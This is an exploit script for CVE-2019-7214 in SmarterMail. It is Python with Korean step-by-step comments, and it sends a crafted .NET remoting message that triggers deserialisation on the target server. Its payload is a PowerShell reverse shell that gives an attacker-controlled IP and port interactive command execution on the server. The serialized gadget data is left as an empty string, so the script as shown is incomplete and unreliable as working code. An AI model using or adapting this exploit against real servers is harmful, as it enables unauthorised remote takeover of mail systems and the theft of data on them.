# Exploit Title: SmarterMail Build 6985 - Remote Code Execution
# Exploit Author: 1F98D
# Original Author: Soroush Dalili
# Date: 10 May 2020
# Vendor Hompage: re
# CVE: CVE-2019-7214
# Tested on: Windows 10 x64
# References:
# https://www.nccgroup.trust/uk/our-research/technical-advisory-multiple-vulnerabilities-in-smartermail/
#
# SmarterMail before build 6985 provides a .NET remoting endpoint
# which is vulnerable to a .NET deserialisation attack.
#
#
#!/usr/bin/python3

import base64
import socket
from struct import pack

# ── 설정값 ─────────────────────────────────────────────
HOST = "192.168.213.65"    # 대상 SmarterMail 서버 IP
PORT = 17001                # SmarterMail .NET remoting 엔드포인트 포트
LHOST = "192.168.45.194"    # 공격자 IP (리버스 셸 연결 대상)
LPORT = 4444                # 공격자 리스너 포트 (nc -lvnp 4444)


# ── 1단계: 리버스 셸 페이로드 생성 ─────────────────────
# PowerShell 리버스 셸 코드를 문자열로 만든다.
# 공격자(LHOST:LPORT)로 TCP 연결 → 명령 수신 → 실행 → 결과 반환
psh_shell = (
    '$client = New-Object System.Net.Sockets.TCPClient("'
    + LHOST
    + '",'
    + str(LPORT)
    + ');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 =$sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
)

# PowerShell -EncodedCommand는 UTF-16LE(UTF-16 Little Endian, base64) 입력을 기대함
# encode("utf-16") → BOM(Byte Order Mark, 2바이트) + UTF-16 데이터 생성
# [2:] → BOM(Byte Order Mark) 제거 (PowerShell은 BOM 없는 UTF-16LE(UTF-16 Little Endian)를 원함)
psh_shell = psh_shell.encode("utf-16")[2:]

# base64 인코딩 (PowerShell -EncodedCommand 형식)
psh_shell = base64.b64encode(psh_shell)

# 1360바이트 고정 길이로 패딩 (payload 내 X 플레이스홀더 교체용)
psh_shell = psh_shell.ljust(1360, b" ")

payload = ""
# ── 2단계: .NET deserialization payload 준비 ────────
# base64로 인코딩된 .NET serialized object (SortedSet + ComparisonComparer)
# 이 객체는 역직렬화 시 ComparisonComparer를 통해 임의 델리게이트 실행
payload = base64.b64decode(payload)

# payload 내 "X" * 1360 플레이스홀더를 실제 PowerShell 명령으로 교체
# → powershell.exe -encodedCommand <base64 PowerShell>
payload = payload.replace(bytes("X" * 1360, "utf-8"), psh_shell)

# ── 3단계: .NET remoting 프로토콜 메시지 구성 ────────
# SmarterMail의 .NET remoting 엔드포인트 주소
uri = bytes("tcp://{}:{}/Servers".format(HOST, str(PORT)), "utf-8")

# TCP 소켓으로 대상 서버에 연결
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

# .NET remoting 프로토콜 헤더 조립
msg = bytes()
msg += b".NET"                  # 프로토콜 식별자
msg += b"\x01"                  # 버전 Major
msg += b"\x00"                  # 버전 Minor
msg += b"\x00\x00"             # Operation Type
msg += b"\x00\x00"             # Content Distribution
msg += pack("I", len(payload)) # 페이로드 길이
msg += b"\x04\x00"             # URI Header
msg += b"\x01"                  # Data Type
msg += b"\x01"                  # Encoding (UTF8)
msg += pack("I", len(uri))     # URI 길이
msg += uri                      # 대상 URI
msg += b"\x00\x00"             # Terminating Header
msg += payload                  # 실제 페이로드 (deserialization 트리거)

# 메시지 전송 후 연결 종료
s.send(msg)
s.close()
